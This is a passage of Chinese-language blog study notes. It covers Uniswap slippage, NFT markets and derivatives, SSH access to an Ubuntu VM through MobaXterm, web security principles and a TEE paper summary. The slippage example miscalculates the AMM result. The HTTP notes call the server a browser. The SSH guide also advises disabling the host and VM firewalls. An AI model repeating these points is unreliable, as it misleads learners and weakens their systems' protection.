<h3 id="三、什么是Uniswap-滑点问题"><a href="#三、什么是Uniswap-滑点问题" class="headerlink" title="三、什么是Uniswap 滑点问题"></a>三、什么是Uniswap 滑点问题</h3><p>Uniswap 滑点问题是指用户在去中心化交易所（DEX）如 Uniswap 上进行代币交易时，实际成交价格与预期价格之间的偏差。这种偏差主要由以下原因引起：</p>
<ol>
<li>滑点的本质<br>  定义：滑点是交易执行时的价格与提交交易时的预期价格之间的差异。例如，你希望以 1 ETH &#x3D; 2000 USDT 的价格卖出 ETH，但实际成交价可能是 1995 USDT。</li>
</ol>
<p>  原因：Uniswap 采用自动做市商（AMM）模型，价格由资金池中的代币比例决定。大额交易会显著改变池中代币比例，导致价格波动。</p>
<ol start="2">
<li>主要影响因素</li>
</ol>
<ul>
<li>交易规模：交易量占资金池比例越大，滑点越高。例如，在小资金池中卖出大量代币会大幅压低价格。</li>
<li>市场流动性：流动性低的代币对（如新币或小众币种）滑点更高，因为资金池深度不足。</li>
<li>网络拥堵：交易延迟时（如以太坊网络拥堵），市场价格可能在此期间变动，加剧滑点。</li>
</ul>
<p>  <strong>用户如何应对滑点</strong></p>
<ul>
<li><strong>设置滑点容忍度</strong>：在交易时自定义滑点限制（如 0.5%）。若市场价格波动超过该值，交易将失败以避免损失。</li>
<li><strong>分拆大额交易</strong>：将大单拆分为多个小单，减少对价格的一次性冲击。</li>
<li><strong>选择高流动性池</strong>：交易主流币对（如 ETH&#x2F;USDC）时滑点更低。</li>
<li><strong>使用限价单或聚合器</strong>：通过 Uniswap 的限价单功能或 1inch、Matcha 等聚合器寻找更优路径。</li>
</ul>
<p>  <strong>滑点与 MEV 的关系</strong></p>
<ul>
<li><strong>抢跑攻击（Frontrunning）</strong>：矿工或机器人可能通过提高 Gas 费优先执行交易，利用用户的滑点设置套利。Uniswap v3 引入了“滑点保护”功能来缓解此类问题。</li>
</ul>
<hr>
<p>  <strong>示例</strong></p>
<p>  假设一个 ETH&#x2F;USDC 池中有 100 ETH 和 200,000 USDC（1 ETH &#x3D; 2000 USDT）。若用户试图卖出 10 ETH：</p>
<ul>
<li>交易后池变为 110 ETH 和 200,000 - (10 ETH * 实际价格) USDC。</li>
<li>由于公式 <code>x * y = k</code>，实际获得的 USDC 可能低于 20,000（如 19,800），产生 1% 的滑点。</li>
</ul>
<h3 id="四、什么是IPO？"><a href="#四、什么是IPO？" class="headerlink" title="四、什么是IPO？"></a>四、什么是IPO？</h3><p>​	Initial Public Offering (IPO) 是指公司首次向公众发行股票，通常在传统金融市场中用于筹集资金。在加密货币领域，类似的概念可能包括代币首次发行（ICO、IDO等）。</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>NFT</title>
    <url>/2025/03/29/NFT/</url>
    <content><![CDATA[<h1 id="NFT与数字资产的未来"><a href="#NFT与数字资产的未来" class="headerlink" title="NFT与数字资产的未来"></a>NFT与数字资产的未来</h1><h2 id="1-NFT定义与核心特性"><a href="#1-NFT定义与核心特性" class="headerlink" title="1. NFT定义与核心特性"></a>1. NFT定义与核心特性</h2><p><strong>NFT（Non-Fungible Token）</strong>：非同质化代币  </p>
<p>简单理解:NFT是发行在链上的不可分割、不可复制的具有唯一性的，可以铆钉现实世界商品的资产。</p>
<h2 id="2-NFT的核心价值"><a href="#2-NFT的核心价值" class="headerlink" title="2. NFT的核心价值"></a>2. NFT的核心价值</h2><h3 id="2-1-产业变革"><a href="#2-1-产业变革" class="headerlink" title="2.1 产业变革"></a>2.1 产业变革</h3><ul>
<li><strong>版权保护</strong>：  <ul>
<li>艺术家通过NFT直接掌控作品分发、转售权（如音乐、画作版权）。  </li>
<li>削弱传统中介（如唱片公司、画廊）的垄断。</li>
</ul>
</li>
<li><strong>客户关系</strong>：NFT作为品牌与用户的数字化纽带（如星巴克NFT增强用户粘性）,同时可以促进客户关系，使品牌方知晓相互品牌和客户间的联系。</li>
</ul>
<h3 id="2-2-应用场景"><a href="#2-2-应用场景" class="headerlink" title="2.2 应用场景"></a>2.2 应用场景</h3><p>​	<strong>分类</strong>：艺术作品 音乐 小说 游戏资产 视频 票务 保险&#x2F;发票 订单&#x2F;契约 图片 元字宙土地 域名…… </p>
<ul>
<li><strong>GameFi</strong>：游戏资产NFT化（如Axie Infinity的宠物）。  </li>
<li><strong>生态与服务</strong>：艺术创作者&#x2F;交易平台&#x2F;基础设施&#x2F;NFT-Fi&#x2F;工具&#x2F;应用&#x2F;DAO&#x2F;媒体  </li>
<li><strong>艺术创作类型</strong>：文学、图片、音乐、视频、运动</li>
</ul>
<h2 id="3-NFT生态"><a href="#3-NFT生态" class="headerlink" title="3. NFT生态"></a>3. NFT生态</h2><p><strong>NFT-Fi</strong></p>
<p>Leverage 资产-如何不断提升资本利用效率</p>
<p>-抵押借贷&#x2F;租赁</p>
<p>- Buy Now Pay Later</p>
<p>-碎片化</p>
<p>-众筹</p>
<p>-NFT Stake（质押NFT资产 提升资金利用效率）</p>
<p><strong>基础设施</strong></p>
<p>公链、存储、安全</p>
<p><strong>应用</strong></p>
<p>钱包、PFP、Social·Fi、GameFi、手机壳</p>
<p><strong>工具</strong></p>
<p>NFT数誉分析、NFT社区管理工具、营销平台、NFT定价</p>
<h4 id="2022年顶级NFT系列（交易额）"><a href="#2022年顶级NFT系列（交易额）" class="headerlink" title="2022年顶级NFT系列（交易额）"></a>2022年顶级NFT系列（交易额）</h4><ol>
<li><strong>Bored Ape Yacht Club</strong> - 15.7亿美元  </li>
<li><strong>Otherside</strong> - 11.4亿美元  </li>
<li><strong>Mutant Ape Yacht Club</strong> - 11亿美元  </li>
<li><strong>Azuki</strong> - 8.499亿美元  </li>
<li><strong>CryptoPunks</strong> - 7.06亿美元  </li>
<li>ClonoX-6.150 亿美元</li>
<li>Moonbirds-6.134 亿美元</li>
<li>Meebits -5.752 亿美元</li>
<li>Doodles -3.916 亿美元</li>
<li>Bored Ape Kennel Club -1.4 亿美元<blockquote>
<p><em>注：Yuga Labs占据Top 10中的5席（如BAYC、CryptoPunks 1 3 5 8 10）</em></p>
</blockquote>
</li>
</ol>
<h2 id="4-NFT价值锚定与动机"><a href="#4-NFT价值锚定与动机" class="headerlink" title="4.  NFT价值锚定与动机"></a>4.  NFT价值锚定与动机</h2><h3 id="购买动机"><a href="#购买动机" class="headerlink" title="购买动机"></a>购买动机</h3><ul>
<li><strong>金融投资</strong>：杠杆化资产（如ETH牛市中的NFT增值）。  </li>
<li><strong>情绪价值</strong>：  <ul>
<li>社群身份（如KOL地位）。  </li>
<li>炫耀性消费（如高价PFP头像）。</li>
</ul>
</li>
</ul>
<h3 id="价值支撑"><a href="#价值支撑" class="headerlink" title="价值支撑"></a>价值支撑</h3><ul>
<li><strong>稀缺性</strong>：限量发行（如CryptoPunks的10,000个）。  </li>
<li><strong>实用性</strong>：GameFi道具、元宇宙通行证。</li>
</ul>
<h2 id="6-未来机遇与挑战"><a href="#6-未来机遇与挑战" class="headerlink" title="6. 未来机遇与挑战"></a>6. 未来机遇与挑战</h2><h3 id="机遇"><a href="#机遇" class="headerlink" title="机遇"></a>机遇</h3><ul>
<li><strong>传统行业入场</strong>：Web2品牌（如Nike、星巴克）发行NFT。  </li>
<li><strong>金融创新</strong>：  <ul>
<li>NFT质押（Stake）、ETF、永续合约。  </li>
<li>提高流动性（如AMM机制、碎片化）。</li>
</ul>
</li>
</ul>
<h3 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h3><ul>
<li><strong>市场渗透率</strong>：大众接受度仍需培养。  </li>
<li><strong>监管风险</strong>：版权与金融合规问题。</li>
</ul>
<h2 id="7-关键概念补充"><a href="#7-关键概念补充" class="headerlink" title="7. 关键概念补充"></a>7. 关键概念补充</h2><ul>
<li><strong>Treasury</strong>：DAO或项目的资金池，用于生态发展。  </li>
<li><strong>Metaverse</strong>：虚拟世界（如Decentraland），NFT代表土地或物品。  </li>
<li><strong>NFT Stake</strong>：质押NFT获取收益（类似DeFi质押）。  </li>
<li><strong>NFT ETF</strong>：追踪一篮子NFT价值的基金，降低投资门槛。</li>
</ul>
<h2 id="8-NFT-流动性-如何提高交易深度"><a href="#8-NFT-流动性-如何提高交易深度" class="headerlink" title="8. NFT 流动性-如何提高交易深度"></a>8. NFT 流动性-如何提高交易深度</h2><h4 id="NFT-相关金融衍生品及交易机制解析"><a href="#NFT-相关金融衍生品及交易机制解析" class="headerlink" title="NFT 相关金融衍生品及交易机制解析"></a><strong>NFT 相关金融衍生品及交易机制解析</strong></h4><h4 id="1-二级买卖（做多-做空）"><a href="#1-二级买卖（做多-做空）" class="headerlink" title="1. 二级买卖（做多+做空）"></a><strong>1. 二级买卖（做多+做空）</strong></h4><ul>
<li><strong>做多（Buy Long）</strong>：投资者买入NFT，预期其价格上涨后卖出获利。</li>
<li><strong>做空（Sell Short）</strong>：通过借贷平台（如NFTfi）借入NFT并立即卖出，等价格下跌后买回归还，赚取差价。</li>
<li><strong>与NFT的关系</strong>：<ul>
<li>传统NFT交易仅限于现货买卖，做空机制引入了对冲和套利策略。</li>
<li>依赖借贷协议或衍生品市场实现双向交易。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-NFT-ETF"><a href="#2-NFT-ETF" class="headerlink" title="2. NFT ETF"></a><strong>2. NFT ETF</strong></h4><ul>
<li><strong>定义</strong>：追踪一篮子NFT（如蓝筹PFP、虚拟土地）价格的指数基金，通过代币化份额（ERC-20）降低投资门槛。</li>
<li><strong>与NFT的关系</strong>：<ul>
<li>解决NFT流动性差的问题，散户可小额投资多个NFT资产。</li>
<li>例如：<strong>NFTX</strong> 提供基于BAYC、CryptoPunks的指数基金。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-NFT-Perp永续合约"><a href="#3-NFT-Perp永续合约" class="headerlink" title="3. NFT Perp永续合约"></a><strong>3. NFT Perp永续合约</strong></h4><ul>
<li><strong>定义</strong>：以NFT指数价格为标的的永续合约（如BAYC地板价），支持杠杆交易（做多&#x2F;做空）。</li>
<li><strong>与NFT的关系</strong>：<ul>
<li>无需持有实物NFT即可交易其价格波动（如<strong>Blur</strong>的借贷池衍生品）。</li>
<li>风险：依赖预言机喂价，可能因流动性不足被操纵。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-AMM（自动化做市商）"><a href="#4-AMM（自动化做市商）" class="headerlink" title="4. AMM（自动化做市商）"></a><strong>4. AMM（自动化做市商）</strong></h4><ul>
<li><strong>NFT-AMM模型</strong>：<ul>
<li><strong>碎片化AMM</strong>：将NFT拆分为ERC-20代币（如Fractional），在Uniswap等DEX交易。</li>
<li><strong>流动性池</strong>：用户质押NFT或代币提供流动性（如SudoSwap的链上订单簿）。</li>
</ul>
</li>
<li><strong>与NFT的关系</strong>：<ul>
<li>提升NFT流动性，实现即时买卖。</li>
<li>缺点：可能稀释NFT独特性（如碎片化后失去所有权）。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-ERC-721P（可编程NFT标准）"><a href="#5-ERC-721P（可编程NFT标准）" class="headerlink" title="5. ERC-721P（可编程NFT标准）"></a><strong>5. ERC-721P（可编程NFT标准）</strong></h4><ul>
<li><strong>特点</strong>：在ERC-721基础上嵌入金融逻辑，例如：<ul>
<li>自动分红（NFT持有者分润项目收入）。</li>
<li>动态属性（根据链上数据变化NFT元数据）。</li>
</ul>
</li>
<li><strong>与NFT的关系</strong>：<ul>
<li>扩展NFT的金融化场景（如游戏资产生息）。</li>
<li>案例：<strong>Chiru Labs</strong>（Azuki）探索ERC-721P的版税强制执行。</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left"><strong>概念</strong></th>
<th align="left"><strong>核心功能</strong></th>
<th align="left"><strong>对NFT生态的影响</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">二级买卖（多空）</td>
<td align="left">双向交易、对冲风险</td>
<td align="left">引入传统金融策略，提高市场效率</td>
</tr>
<tr>
<td align="left">NFT ETF</td>
<td align="left">代币化指数投资</td>
<td align="left">降低散户参与门槛，增强流动性</td>
</tr>
<tr>
<td align="left">NFT Perp</td>
<td align="left">杠杆交易价格波动</td>
<td align="left">投机工具，但依赖预言机可靠性</td>
</tr>
<tr>
<td align="left">AMM</td>
<td align="left">碎片化&#x2F;流动性池交易</td>
<td align="left">解决流动性问题，可能牺牲独特性</td>
</tr>
<tr>
<td align="left">ERC-721P</td>
<td align="left">可编程金融逻辑</td>
<td align="left">推动NFT从收藏品转向实用化资产</td>
</tr>
</tbody></table>
<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>投资者</strong>：利用Perp&#x2F;ETF对冲或杠杆化NFT投资。</li>
<li><strong>项目方</strong>：通过ERC-721P设计经济模型（如版税自动化）。</li>
<li><strong>交易平台</strong>：采用AMM降低买卖滑点（如OpenSea Pro的链上聚合）。</li>
</ul>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>MobaXterm操作</title>
    <url>/2025/04/20/MobaXterm%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p><strong>利用ubantu系统在VMware上配置Linux系统虚拟机</strong></p>
<p>【两分半钟完成VMware安装及Linux-Ubuntu安装（全程无废话）】<a href="https://www.bilibili.com/video/BV1W34y1k7ge?vd_source=8d7dd382f6f8f6be47abce702685a0b0">https://www.bilibili.com/video/BV1W34y1k7ge?vd_source=8d7dd382f6f8f6be47abce702685a0b0</a></p>
<p>（参考此视频）</p>
<p><strong>虚拟机上Ssh的开启与安装</strong></p>
<p>【Linux虚拟机开启SSH服务 -  CSDN App】<a href="http://t.csdnimg.cn/JE5nY">http://t.csdnimg.cn/JE5nY</a></p>
<p>Ps:还要注意要将虚拟机和电脑主机的防火墙关闭</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><strong>一、查看虚拟机的 Host 信息</strong><br>启动 VMware 虚拟机，进入 Ubuntu 系统。<br>在虚拟机内，点击 应用程序，然后选择 终端 打开命令行界面。(或者直接快捷键Ctrl + Alt + T 打开终端)<br>输入命令 ifconfig 查看虚拟机的 IP 地址和主机信息。<br>红框中显示的是虚拟机的 IP 地址。</p>
<p><img src="https://s2.loli.net/2025/04/26/3o5ExemDaP6fLNu.jpg" alt="1.png"></p>
<p>下面显示的是虚拟机的用户名（如：root123）。</p>
<p><img src="https://s2.loli.net/2025/04/26/36qVgCS1RPHsdMY.jpg" alt="2.png"></p>
<p>注：用户名和密码是创建虚拟机时设定的。</p>
<p><strong>二、通过 MobaXterm 连接虚拟机</strong></p>
<ol>
<li><p>打开 MobaXterm。</p>
</li>
<li><p>点击左上角的 Session（会话），然后选择 SSH。</p>
</li>
<li><p>在弹出的窗口中，输入虚拟机的 Host（IP 地址）和 用户名（如：root123）。</p>
</li>
</ol>
<blockquote>
<p>端口 保持默认（通常是 22）。</p>
</blockquote>
<ol start="4">
<li>点击 OK 生成会话。</li>
</ol>
<p><img src="https://s2.loli.net/2025/04/26/Ov69KaQwrxY8JAs.jpg" alt="3.png"></p>
<ol start="5">
<li>会提示输入虚拟机的 密码，注意：输入密码时不会显示字符。</li>
</ol>
<blockquote>
<p>如果是第一次连接，MobaXterm 可能会要求设置一个 MobaXterm 密码（至少七位字符）。<br>输入完密码后，成功连接后会进入虚拟机的命令行界面。</p>
</blockquote>
<h2 id="出现问题"><a href="#出现问题" class="headerlink" title="出现问题"></a>出现问题</h2><ol>
<li><strong>time out</strong></li>
</ol>
<p>a. 可能是虚拟机上的ssh 未开启&#x2F;未安装</p>
<p>b. 虚拟机网络信息不可用。</p>
<p>c. 可能虚拟机防火墙未关</p>
<p>（虚拟机防火墙关闭指令：</p>
<ul>
<li><p>Ctrl+shift+T敲出终端</p>
</li>
<li><p>关闭防火墙：<code>sudo ufw disable</code>  若提示成功，则已关闭）</p>
</li>
<li><p>查看防火墙状态：<code>sudo ufw status</code> 若显示inactive则关闭）</p>
</li>
</ul>
<ol start="2">
<li><strong>connection refused</strong></li>
</ol>
<p>a. 可能电脑防火墙未关</p>
<ol start="3">
<li><strong>Access denied</strong></li>
</ol>
<p>a. 密码错误</p>
<p>b. 网络模式非NAT（在虚拟机-编辑-虚拟网络编辑器中设置）</p>
<ul>
<li><p>对于b步的解决方式：</p>
<p>​		更改设置——nat模式——nat设置——添加</p>
</li>
</ul>
<p><strong>c.</strong> 虚拟机没有网络信息（右上角刷新&#x2F;重启虚拟机）</p>
<blockquote>
<p>对于c步的补充：尝试【VMware 虚拟机里连不上网的三种解决方案_vmware虚拟机无法连接网络 -  CSDN App】<a href="http://t.csdnimg.cn/68KCp">http://t.csdnimg.cn/68KCp</a></p>
</blockquote>
<p>还有一些我没有遇到的常见问题补充：</p>
<ol>
<li><p>【使用MobaXterm远程连接虚拟机以及遇到的问题 -  CSDN App】<a href="http://t.csdnimg.cn/0r1l6">http://t.csdnimg.cn/0r1l6</a></p>
</li>
<li><p>以及主要的【Mobaxterm连接虚拟机报 Access denied错误 -  CSDN App】<a href="http://t.csdnimg.cn/J0dK3">http://t.csdnimg.cn/J0dK3</a> （ 中间还用到安装vim方法【Linux虚拟机中安装vim（超详细） -  CSDN App】<a href="http://t.csdnimg.cn/SGvmm">http://t.csdnimg.cn/SGvmm</a> ）</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB安全</title>
    <url>/2024/12/01/WEB%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h4 id="如何实施安全评估："><a href="#如何实施安全评估：" class="headerlink" title="如何实施安全评估："></a>如何实施安全评估：</h4><p>资产等级划分—威胁建模—风险分析—设计安全方案</p>
<ol>
<li>资产等级划分</li>
</ol>
<p><strong>划分信任域</strong></p>
<p>  根据网络逻辑划分（信任程度：数据库&gt;web应用&gt;Internet）</p>
<p>互联网安全核心——数据安全</p>
<ol start="2">
<li>威胁建模</li>
</ol>
<p><strong>找出威胁</strong></p>
<p>方法：STRIDE模型</p>
<table>
<thead>
<tr>
<th>威胁</th>
<th>定义</th>
<th>对应安全属性</th>
</tr>
</thead>
<tbody><tr>
<td>Spoofing(伪装)</td>
<td>冒充他人身份</td>
<td>认证</td>
</tr>
<tr>
<td>Tampering（篡改）</td>
<td>修改数据或代码</td>
<td>完整性</td>
</tr>
<tr>
<td>Repudiation（抵赖）</td>
<td>否认做过的事情</td>
<td>不可抵赖性</td>
</tr>
<tr>
<td>Information Disclosure(信息泄露)</td>
<td>机密信息泄露</td>
<td>机密性</td>
</tr>
<tr>
<td>Denial of service(拒绝服务)</td>
<td>拒绝服务</td>
<td>可用性</td>
</tr>
<tr>
<td>Elevation of Privilege(提升权限)</td>
<td>未经授权获得许可</td>
<td>授权</td>
</tr>
</tbody></table>
<ol start="3">
<li>风险分析</li>
</ol>
<p><strong>判断风险高低</strong>（风险&#x3D;可能性*潜在危害）</p>
<p> 方法：DREAD模型</p>
<ol start="4">
<li>设计安全方案</li>
</ol>
<p>安全是产品的属性</p>
<p><strong>优秀安全方案所具备特点：</strong></p>
<ul>
<li>能够解决问题</li>
<li>用户体验好</li>
<li>高性能</li>
<li>低耦合</li>
<li>易于扩展与升级</li>
</ul>
<h4 id="安全方案设计原则："><a href="#安全方案设计原则：" class="headerlink" title="安全方案设计原则："></a><strong>安全方案设计原则：</strong></h4><p> 1.“默认安全原则”</p>
<p>a.    专家系统：黑名单&amp;白名单</p>
<p>   （白名单-允许&#x2F;黑名单-不允许）</p>
<p>b.    最小权限原则（不要过度授权）</p>
<p>c.    “纵深防御”原则——类似圈层防御</p>
<p>l 从不同层面、不同方面实施安全方案</p>
<p>具有根本性，针对性</p>
<p>d.    “数据与代码分离”原则</p>
<p>这一原则适用于各种由于“注入”而引发安全问题的场景</p>
<p>Eg:将页面代码中将“<script>”标签变成代码片段的一部分（对<>等符号进行处理）</p>
<p>e.    “随机性”原则</p>
<ol>
<li><p>利用计算的单向（当逆推时，计算变得十分复杂）性，生成随机字符串，攻击者猜中的概率就很小，增加安全性。</p>
</li>
<li><p>随机性（不可预测性）——提高篡改、伪造等攻击 的门槛</p>
</li>
<li><p>注意计算机中采用的随机数一般是伪随机数</p>
</li>
</ol>
<h4 id="HTTP协议与Web应用"><a href="#HTTP协议与Web应用" class="headerlink" title="HTTP协议与Web应用"></a>HTTP协议与Web应用</h4><p>HTTP协议中与安全有关的知识</p>
<p> http协议只能由客户端单向发起请求，服务端（一般为浏览器）再响应请求。</p>
<p>​                               </p>
<p>出于安全考虑，要遵循以下基本原则：</p>
<ol>
<li><p>GET和HEAD方法应当只用于对服务端没有副作用的操作（即“只读”操作）。对于GET请求，浏览器在刷新页面时不会要求用户确认，对于有副作用（即增加，删除，更改数据）的POST请求，在刷新界面时会询问用户是否要重新发送，避免多余操作（重复下单等）</p>
</li>
<li><p>PUT和DELETE一般用于直接上传和删除文件（大部分不会用到，且若被攻击时很危险，无需求时应该禁用）</p>
</li>
<li><p>尽量用POST提交敏感数据，用GET提交易造成数据的泄露。</p>
</li>
<li><p>在服务端获取请求参数时，应当说清是从GET参数还是从POST参数请求</p>
</li>
<li><p>TRACE方法通常用于诊断调试，服务端直接返回请求中的内容（生产环境的服务器应当禁用TRACE）</p>
</li>
<li><p>CONNECT方法用于在客户端和目标地址之间建立一个TCP隧道，只有初始请求是HTTP协议，后续所有双向流量都是在TCP连接上传输的</p>
</li>
</ol>
<p>Referer头指示了当前请求是从哪个URL页面发起的（URL中一般不要包含敏感信息，可能造成信息泄露）</p>
<p><strong>关于HTTP响应：</strong></p>
<p> HTTP响应与请求是一一对应的，响应中版本号不一定要与请求中的版本号一样，但是其大版本号不能高于请求的大版本号，例如请求是HTTP/1.0版本的，服务器响应不能为HTTP/2但是可以为HTTP/1.1版本的</p>
<p>对<strong>状态码：</strong></p>
<p>分析状态码可以实现简单的安全监测（Eg:一个访问者在短时间内产生大量404响应，很可能是有攻击者在做网站扫描探测；某页面有大量500响应，可能意味着程序存在BUG等或被攻击行为）</p>
<p>HTTP的响应头是通过“\r\n”分割的</p>
<p><img src="https://s2.loli.net/2024/12/01/6EFGWABzYn7tbqU.jpg" alt="1.jpg"></p>
<p><img src="https://s2.loli.net/2024/12/01/8bog7nRvIpmqFcx.jpg" alt="2.jpg"></p>
<p><img src="https://s2.loli.net/2024/12/01/24pKLQW9G3XxbiM.jpg" alt="3.jpg"></p>
<p><img src="https://s2.loli.net/2024/12/01/YCcQRwT6ZD8aej4.jpg" alt="4.jpg"></p>
]]></content>
  </entry>
  <entry>
    <title>TEE的初步理解与认识</title>
    <url>/2025/01/11/TEE%E7%9A%84%E5%88%9D%E6%AD%A5%E7%90%86%E8%A7%A3%E4%B8%8E%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<p>【论文阅读摘要】</p>
<p>关键词：可信执行环境  </p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>可信执行环境（trusted execution environment, TEE）技术，<strong>用于保护非可信平台中应用和数据可信 执行. TEE 通常采用隔离部分软硬件资源的方法构 建安全区域，确保在其中运行的程序和数据保密性 和完整性不受外部干扰。</strong></p>
<p>一个可靠的TEE 需要提供 4 方面的<strong>安全保障</strong></p>
<p>1）<strong>数据隔离</strong>：一个可信应用使用的数据不能被其他应用访问、修改，包括可信应用的数据对外部操作系统隔离以及多个可信应用之间的数据隔离.。</p>
<p>2）<strong>计算隔离</strong>：可信应用的计算资源不能被其他应用观测和拦截，同时需要清理可信应用执行后的痕迹，并防御来自侧信道的攻击。</p>
<p>3）<strong>通信控制</strong>：非可信应用和可信应用、多个可信应用之间的<strong>会话和数据交互不能破坏隔离性</strong>.</p>
<p>4） <strong>错误隔离</strong>：非可信区域的安 全漏洞不能扩散到可信应用中.</p>
<p><strong>实用的 TEE 设计思路是基于硬件隔离基础，通过数据加解密和特权指令执行实现其安 全服务.</strong></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>现有的 TEE 技术具有 3 个明显特点</p>
<p>1）<strong>面向用户设计</strong></p>
<p>2）<strong>硬件辅助支持设计</strong>：从基于 x86 到 RISC-V 架 构的平台均引入了新硬件特性</p>
<p>3）<strong>共享资源</strong>：虽然在设计 TEE 的过程中引入了 新的加解密引擎、协处理器等. 但TEE仍然复用主处 理器和内存单元，与不可信系统的数据交互保持便捷性</p>
<p>然而现有的 TEE 技术均存在不同程度的缺陷：</p>
<ol>
<li>安全攻击. 由于 TEE 技术和操作系统并非完全的隔离，如共用处理器、内存、缓存等，<strong>导致TEE 容易面临来自共享资源的侧信道攻击.</strong> </li>
<li>性能影响. TEE 中数据保护普遍采用<strong>内存加密</strong>的方式防止数据泄露，即使通过硬件电路支持加 解密操作，其<strong>数据访问效率仍然低于明文计算.</strong> </li>
<li>服务便捷性. 早期 TEE中部署的简化操作系 统所提供的服务有限且由服务商定制，难以部署大型应用. TEE 面向用户设计后，用户可以在应用层实现关键代码的安全执行，<strong>但对于系统资源的调用仍 然需要非可信系统的支持</strong>. 目前在推出安全虚拟化 的 TEE 技术后，用户安全应用领域将进一步发展.</li>
</ol>
<h2 id="代表性设计"><a href="#代表性设计" class="headerlink" title="代表性设计"></a>代表性设计</h2><p>当前主流计算机系统架构包括 x86，Arm 等均在 其设备平台中部署TEE 技术，代表性设计包括软件 保护拓展 Intel SGX  和 Arm TrustZone。</p>
<p><strong>其中 SGX 通过内存隔离和加密，以及拓展的指令集在用户空间提供 TEE</strong>，实现不同程序间的隔离运行，保证用户关键代码和数据的机密性和完整性不受恶意软件的破坏. </p>
<p><strong>而 TrustZone 则是通过设计处理器不同的处理模 式，结合隔离内存等软硬件资源，将系统划分为安全和非安全 2 个世界</strong>. 因此服务提供商通过在安全世界 中部署独立于用户操作系统的可信应用，为用户提供身份认证和授权服务. </p>
<h4 id="基于x86架构的TEE"><a href="#基于x86架构的TEE" class="headerlink" title="基于x86架构的TEE"></a>基于x86架构的TEE</h4><ul>
<li><p>主要面向家用、商用服务领域。</p>
</li>
<li><p>优点在于高性能以及强兼容性</p>
</li>
<li><p>目前主要以 Intel，AMD 厂商为代表推动 x86 架构的发展</p>
</li>
<li><p>x86 TEE是基于物理隔离方法和加密验证技术 构建的. </p>
</li>
<li><p><strong>可信平台技术</strong>：</p>
<ol>
<li><p>目前设备中普遍部署TPM2.0 版本</p>
<p>（<strong>TPM</strong>: TPM 作为一种集成到芯片组中的微控制器，主要用 于密钥生成、存储和证书验证，同时保存系统各层次模块的测量值. <strong>TPM 基于硬件的密码学特点可以保证存储数据免受外部恶意软件的攻击</strong>，因此是广泛应用于系统启动和应用部署的安全策略的基础 ）</p>
</li>
</ol>
</li>
</ul>
<hr>
<ul>
<li><strong>基于协处理器的可信子系统</strong></li>
</ul>
<ol>
<li><p><strong>ME,Intel 管理引擎</strong></p>
<ul>
<li><p>ME 子系统拥有独立的计算能力和内存空间,因此在 Intel 架构安全体系中 作为基础可信域存在</p>
</li>
<li><p>ME 子系统拥有独立的物理地址和 IP 地址，通 过直接连接网卡访问远程资源，因此管理端可以通 过 ME 子系统远程透明地管理设备开关机、主系统 启动验证、设备温度、电压等物理特征检测，甚至对主系统运行时状态监控.</p>
</li>
</ul>
</li>
<li><p><strong>PSP，AMD平台安全处理器</strong></p>
</li>
</ol>
<hr>
<ul>
<li><strong>基于处理器模式的可信系统</strong></li>
</ul>
<p>背景: 针对协处理器和主处理器之间的隔离性，ME 和 PSP 子系统<strong>只能管控平台设备的物理属性</strong>，<strong>因此子系统难以同步获取和验证主系统状态</strong>，也不能操控主系统的正常运行</p>
<p>基于主 CPU 的不同执行模式构建的TEE则能有效控制主系统. Intel 和 AMD 平台利用系统管理模式 SMM 部署了可信服务代码。</p>
<p>基于 SMM 计算模式以及内存区域的隔离性，设备制造商（OEM）可以在设备出厂前<strong>部署管理需求的任务，如 CPU 电源管理、启动代码块验证、TPM 数据清理等一系列高权限的处理模块</strong>。</p>
<hr>
<ul>
<li><strong>基于内存加密的用户TEE</strong></li>
</ul>
<p>​			Intel 和 AMD 分别提出 Intel SGX 和 AMD SEV  技术. Intel SGX 为用户提供应用层 TEE。</p>
<p>​			AMD 为用户提供系统级的TEE，通过内存加密和虚拟化技术，直接构建面向用户的安全虚拟机系统. </p>
<p>​			AMD SEV 尤其适用于云环境下对租户提供安全计算平台的需求</p>
<p><strong>x86 TEE 面临的安全风险与挑战</strong></p>
<p>TEE 面临的主要安全风险来自于 2 个方面：内部软硬件设计漏洞和外部侧信道攻击. </p>
<p>软硬件设计漏 洞问题包括控制逻辑代码缺陷、接口设计不严谨等，</p>
<ol>
<li>针对隔离机制的攻击</li>
<li>基于共享资源的侧信道攻击</li>
<li>基于硬件设计漏洞的攻击</li>
</ol>
<h4 id="基于-Arm-架构的-TEE"><a href="#基于-Arm-架构的-TEE" class="headerlink" title="基于 Arm 架构的 TEE"></a>基于 Arm 架构的 TEE</h4><h4 id="基于-RISC-V-架构的-TEE"><a href="#基于-RISC-V-架构的-TEE" class="headerlink" title="基于 RISC-V 架构的 TEE"></a>基于 RISC-V 架构的 TEE</h4><h4 id="异构计算单元的-TEE"><a href="#异构计算单元的-TEE" class="headerlink" title="异构计算单元的 TEE"></a>异构计算单元的 TEE</h4>]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>PBFT共识算法</title>
    <url>/2024/12/16/PBFT%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/</url>
